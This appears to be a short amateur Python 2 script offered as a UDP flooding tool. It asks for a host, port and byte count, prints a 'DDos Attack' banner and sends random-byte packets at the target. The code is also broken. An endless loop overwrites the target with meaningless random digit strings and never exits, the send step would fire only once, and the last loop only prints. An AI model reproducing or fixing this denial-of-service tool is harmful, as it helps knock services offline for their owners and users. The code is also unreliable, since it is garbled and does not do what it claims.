#!/usr/bin/env python
# coding=utf-8
from scapy.all import *
import os, sys
import time
import  socket
import random
#host && Port
target_host = raw_input("HOST :")
target_port = input("Port :")
i = 1
packetes = input("Bytes :")
#Multiples IPS
while True:
   a = str(random.randint(1,5))
   b = str(random.randint(1,5))
   c = str(random.randint(1,1))
   d = str(random.randint(1,1))
   dot = str(random.randint(1,2))
   target_host = a + dot + b + dot + c + dot + d
      
#packet
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(packetes)
sock.sendto(bytes, (target_host, target_port))
os.system("clear")
os.system("figlet DDos Attack")
#conexion_client
sent = 999
pysendfile = 0
while True:

 print(bytes, target_host, target_port, i)
 
 i = i + 1
            
